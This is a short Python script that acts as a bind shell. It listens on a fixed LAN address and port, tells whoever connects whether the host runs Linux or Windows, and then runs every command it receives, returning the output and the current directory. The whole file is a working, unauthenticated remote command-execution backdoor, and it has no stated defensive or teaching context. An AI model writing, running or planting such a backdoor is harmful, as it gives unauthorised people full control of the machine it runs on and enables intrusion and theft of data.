#!/usr/bin/python3

import socket
import os
import subprocess

SERVER_HOST = "192.168.1.146"
SERVER_PORT = 6666
BUFFER_SIZE = 4096
SEPARATOR = "<sep>"
s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
client_socket, client_address = s.accept()
tout = subprocess.getoutput("ls")
if ('recognized' not in tout):
    client_socket.send('linux'.encode())
else:
    client_socket.send('windows'.encode())
del tout
cwd = os.getcwd()
client_socket.send(cwd.encode())
while True:
    command = client_socket.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    client_socket.send(message.encode())